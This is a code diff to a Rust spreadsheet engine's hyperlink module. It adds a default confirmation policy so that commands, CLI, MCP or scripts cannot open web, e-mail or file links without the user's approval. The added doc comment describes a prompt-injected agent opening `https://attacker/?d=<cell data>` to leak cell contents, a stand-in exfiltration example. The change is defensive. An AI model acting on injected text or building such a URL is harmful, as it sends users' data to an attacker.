@@ -4,12 +4,76 @@
 //! URL handlers, `javascript:` and the like are refused. A local target is opened only after the
 //! user confirms it, only when it exists, and never when it is a program or script
 //! ([`resolve_local`]). Everything else without a scheme stays an in-workbook reference.
+//!
+//! Opening an allowed address or file also needs the user's say-so (#2181): `link.open` is
+//! reachable by the control channel, the CLI, MCP and workbook scripts, so a prompt-injected agent
+//! could open `https://attacker/?d=<cell data>`. Under the default [`LinkPolicy::Confirm`] the
+//! command refuses external addresses and local files; only the host, after showing the address
+//! and getting OK from the user, opens one through [`crate::Session::open_confirmed_link`], which
+//! no command reaches.
 
 use std::path::{Path, PathBuf};
 
 use gridcraft_core::{CellRef, RangeRef};
 use gridcraft_formula::Expr;
 use gridcraft_model::Workbook;
+use serde_json::{Value as Json, json};
+
+use crate::{EngineError, Session, UiRequest};
+
+/// Whether `link.open` may hand an external (`http`/`https`/`mailto`) address or a local file or
+/// folder to the host without asking. Set by the host in code, never by a command, so a
+/// programmatic caller can't widen it.
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+pub enum LinkPolicy {
+    /// `link.open` refuses external addresses and local files; the user opens them by clicking the
+    /// link, which asks first ([`Session::open_confirmed_link`]). References still navigate.
+    #[default]
+    Confirm,
+    /// The host trusts every caller of this session (an embedding that vets requests itself):
+    /// `link.open` opens allowed addresses and files directly. Disallowed schemes stay refused.
+    Allow,
+}
+
+/// The error a programmatic `link.open` of a web or e-mail address, or of a file, returns.
+pub const NEEDS_CONFIRMATION: &str = "Web, e-mail and file links open only when the user clicks them and confirms; a command can't open them.";
+
+impl Session {
+    /// Opens a link the user has just confirmed in the host's "Open Hyperlink" prompt: an allowed
+    /// address or an existing file or folder goes to the host (`UiRequest::OpenUrl`), a reference
+    /// selects, anything else is refused ([`classify`]). A full path is the one the prompt showed
+    /// (already resolved): it is opened as it is, so a `#` in it stays part of the name. Not a
+    /// command: only host code that showed the user this exact address may call it.
+    pub fn open_confirmed_link(&mut self, target: &str) -> crate::Result<Json> {
+        if is_full_path(target) {
+            return self.open_local(target);
+        }
+        match classify(target) {
+            LinkKind::Internal(r) => self.execute("edit.goTo", json!({"reference": r.trim_start_matches('#')})),
+            LinkKind::External(u) => {
+                self.ui_requests.push(UiRequest::OpenUrl(u.clone()));
+                Ok(json!({"opened": u}))
+            }
+            LinkKind::Local(path) => self.open_local(&path),
+            LinkKind::Refused(why) => Err(EngineError::Other(why)),
+        }
+    }
+
+    /// Hands an existing file or folder to the host: a full path as it is, a relative one from the
+    /// folder of the saved workbook ([`resolve_local`]).
+    pub(crate) fn open_local(&mut self, path: &str) -> crate::Result<Json> {
+        let full = if is_full_path(path) {
+            resolve_full_path(path)
+        } else {
+            let base = self.doc()?.path.as_deref().and_then(|f| Path::new(f).parent().map(Path::to_path_buf));
+            resolve_local(base.as_deref(), path)
+        }
+        .map_err(EngineError::Other)?;
+        let opened = full.to_string_lossy().into_owned();
+        self.ui_requests.push(UiRequest::OpenUrl(opened.clone()));
+        Ok(json!({"opened": opened}))
+    }
+}
 
 /// What a link target is.
 #[derive(Clone, Debug, PartialEq, Eq)]
